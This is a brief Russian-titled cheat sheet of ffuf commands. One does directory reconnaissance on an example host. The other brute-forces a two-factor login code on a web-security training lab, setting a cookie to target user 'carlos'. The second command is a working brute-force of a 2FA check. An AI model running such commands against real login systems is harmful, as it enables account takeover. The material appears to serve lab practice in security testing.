Использование  FFUF

# Recon
```sh
ffuf -u "https://common.example.com/FUZZ" -w spider.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
```

# Fuzzing
```sh
ffuf -w E:\Projects\mfa_codes.txt -u “https://0a8300db0415f6be811684c6004c0059.web-security-academy.net/login2" -X POST -H “Host:0a8300db0415f6be811684c6004c0059.web-security-academy.net” -H “Cookie: verify=carlos” -H “Content-Type: application/x-www-form-urlencoded” -d “mfa-code=FUZZ” -v -fc 200 -H “Accept: */*” -H “User-Agent: Mozilla/5.0” -fs 3080 -H “Connection: close”
```

# Emuneration 



